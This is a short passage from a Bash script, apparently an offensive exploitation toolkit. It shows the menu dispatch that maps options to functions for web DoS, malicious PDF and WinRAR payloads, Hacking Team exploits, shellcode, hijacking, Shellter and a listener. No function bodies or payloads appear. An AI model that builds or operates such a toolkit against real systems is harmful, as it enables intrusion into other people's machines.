14) sh_webdos ;;
15) sh_firefoxaddon ;;
16) sh_PDF ;;
17) sh_winrar ;;
18) sh_vbs ;;
19) sh_DLINK ;;
20) sh_hackingteam ;;
21) sh_wind ;;
22) sh_apple ;;
23) sh_linux ;;
24) sh_multi ;;
25) sh_androi ;;
26) sh_shell ;;
27) sh_shellcod ;;
28) sh_hijack ;;
29) sh_Shellter ;;
1help) sh_1help ;;
2help) sh_2help ;;
3help) sh_3help ;;
4help) sh_4help ;;
5help) sh_5help ;;
6help) sh_6help ;;
7help) sh_7help ;;
8help) sh_8help ;;
9help) sh_9help ;;
10help) sh_10help ;;
11help) sh_11help ;;
12help) sh_12help ;;
13help) sh_13help ;;
14help) sh_14help ;;
15help) sh_15help ;;
16help) sh_16help ;;
17help) sh_17help ;;
18help) sh_18help ;;
19help) sh_19help ;;
20help) sh_20help ;;
l) sh_lisen ;;
L) sh_lisen ;;
q) sh_exit ;;
db) sh_database ;;
*) echo "\"$choice\": is not a valid choise"; sleep 2 ;;
esac
done
